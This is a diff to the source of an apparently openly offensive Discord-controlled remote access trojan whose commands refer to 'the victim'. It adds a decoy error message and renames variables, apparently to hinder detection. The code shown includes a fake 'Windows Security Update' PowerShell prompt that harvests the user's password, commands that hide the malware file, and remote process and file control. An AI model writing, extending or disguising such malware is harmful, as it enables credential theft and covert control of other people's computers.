@@ -70,10 +70,10 @@ discord.opus.load_opus(opuslib_path)
 config = {
     "startup": True,
     "error": True,
-    "error_message": "",
+    "error_message": "Unable to retrieve data from main.py.",
     "disable_av": False,
     "hide": False,
-    "token": "Token thing here",
+    "token": "",
     "token_1": "Backup Token 1",
     "token_2": "Backup Token 2",
     "token_3": "Backup Token 3",
@@ -110,8 +110,8 @@ def triggerconfig():
 
     if config.get("hide"):
         try:
-            frame = inspect.getframeinfo(inspect.currentframe()).filename
-            os.system("""attrib +h "{}" """.format(frame))
+            cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
+            os.system("""attrib +h "{}" """.format(cmd237))
         except Exception as e:
             print(f"Error hiding file: {e}")
 
@@ -1517,7 +1517,7 @@ async def viewFile(ctx, message):
 
         if os.path.isfile(file_path):
             file_size = os.path.getsize(file_path)
-            creation_time = datetime.fromtimestamp(os.path.getctime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
+            creation_time = datetime.datetime.fromtimestamp(os.path.getctime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
             embed = discord.Embed(title=f"📄 File Details: {selected_file}", color=0xe67e22)
             embed.add_field(name="File Size", value=f"{file_size} bytes", inline=False)
             embed.add_field(name="Creation Date", value=creation_time, inline=False)
@@ -2743,9 +2743,9 @@ async def killprocess(ctx, *, proc: str):
 @bot.command(help="Get the windows PIN that the victim uses. (may not be correct at times.)")
 async def getwindowspassword(ctx):
     if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
-        popui = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
-        popuipass = 'echo $cred.getnetworkcredential().password;'
-        full_cmd = 'Powershell "{} {}"'.format(popui,popuipass)
+        cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
+        cmd92 = 'echo $cred.getnetworkcredential().password;'
+        full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
 
         def shell():   
             output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -2822,18 +2822,18 @@ async def admincheck(ctx):
 @bot.command(help="Hides the file.")
 async def hide(ctx):
     if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
-        frame = inspect.getframeinfo(inspect.currentframe()).filename
-        os.system("""attrib +h "{}" """.format(frame))
-        await ctx.send(f":white_check_mark: File {frame} successfully hidden")
+        cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
+        os.system("""attrib +h "{}" """.format(cmd237))
+        await ctx.send(f":white_check_mark: File {cmd237} successfully hidden")
     else:
         return
 
 @bot.command(help="Unhides the file.")
 async def unhide(ctx):
     if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
-        frame = inspect.getframeinfo(inspect.currentframe()).filename
-        os.system("""attrib -h "{}" """.format(frame))
-        await ctx.send(f":white_check_mark: File {frame} successfully shown")
+        cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
+        os.system("""attrib -h "{}" """.format(cmd237))
+        await ctx.send(f":white_check_mark: File {cmd237} successfully shown")
     else:
         return
 
